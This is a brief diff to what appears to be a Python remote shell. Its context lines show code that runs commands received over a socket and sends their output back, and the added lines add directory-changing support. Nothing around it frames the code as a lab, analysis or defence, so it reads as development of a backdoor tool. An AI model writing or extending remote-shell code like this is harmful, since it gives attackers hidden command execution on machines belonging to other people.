@@ -20,3 +20,5 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = output_bytes.decode("utf-8", errors="replace")
             s.send(str.encode(output_str))
+        elif data.split()[0] == 'cd':
+            os.chdir(data[3:])
